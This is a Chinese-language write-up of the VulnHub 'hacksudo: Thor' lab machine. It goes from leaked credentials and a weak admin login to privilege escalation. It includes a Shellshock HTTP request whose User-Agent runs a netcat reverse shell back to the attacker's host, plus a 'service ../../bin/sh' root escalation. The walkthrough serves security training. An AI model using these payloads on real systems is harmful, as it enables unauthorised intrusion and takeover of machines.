---
title: VulnHub hacksudo：Thor
date: 2026-06-15 18:45:00
categories: 
  - VulnHub
tags:
  - 敏感信息泄露
  - 弱口令
  - RCE
  - Python 升级为交互式 Shell
  - /etc/sudoers 配置不当
  - 命令注入
  - service 提权
---

# hacksudo：Thor

项目地址：https://download.vulnhub.com/hacksudo/hacksudo---Thor.zip

是一个打包好的镜像文件

**注意：导入 ova 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6a32091cb67c7e4f4a8873bd.png)

## 敏感信息泄露

### README.md

扫描目录发现有个 `README.md` 文件

![](https://pic1.imgdb.cn/item/6a3209ebb67c7e4f4a887431.png)

访问拿到账号密码

![](https://pic1.imgdb.cn/item/6a320a15b67c7e4f4a887452.png)

## 弱口令

### Administrator Login

在 `/admin_login.php` 页面中登录成功

![](https://pic1.imgdb.cn/item/6a320ecab67c7e4f4a889df0.png)

## RCE

### Shellshock（CVE-2014-6271）

没有找到 RCE 点，回看前面目录扫描中有 `/cgi-bin` 目录，继续扫描出两个文件

![](https://pic1.imgdb.cn/item/6a320f4fb67c7e4f4a889e0f.png)

服务器操作系统版本若早于 2014 年 9 月（Bash 未修复），且存在可外部访问的 CGI 脚本（如/cgi-bin/shell.sh），即可高度怀疑存在Shellshock 漏洞

直接打一个反弹 Shell 回来

```http
GET /cgi-bin/backup.cgi HTTP/1.1
Host: 192.168.125.33
User-Agent: () { :;}; /bin/bash -c 'busybox nc 192.168.125.4 8888 -e sh'
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
Cache-Control: max-age=0
```

![](https://pic1.imgdb.cn/item/6a3213d6b67c7e4f4a88a259.png)

## 提权

### Python 升级为交互式 Shell

![](https://pic1.imgdb.cn/item/6a32141fb67c7e4f4a88a48c.png)

### /etc/sudoers 配置不当

检查自身权限，可以使用 `./hammer.sh`

![](https://pic1.imgdb.cn/item/6a321435b67c7e4f4a88a4c9.png)

### 命令注入

以 thor 身份运行脚本，两个选项都输入 `id` 被运行了

![](https://pic1.imgdb.cn/item/6a3214e4b67c7e4f4a88a6ee.png)

这次换成 `/bin/bash` 提权成功

![](https://pic1.imgdb.cn/item/6a321549b67c7e4f4a88a807.png)

提升交互性后检查权限，可以运行 `cat` 以及 `service`

![](https://pic1.imgdb.cn/item/6a32158fb67c7e4f4a88a813.png)

### service 提权

```bash
service ../../bin/sh
```

- 当高权限的 `service` 进程启动时，它会根据参数去执行一个程序

- 如果这个参数是 `../../bin/sh`，`service` 就会去启动一个 `/bin/sh` 进程

提权成功

![](https://pic1.imgdb.cn/item/6a3215cfb67c7e4f4a88a827.png)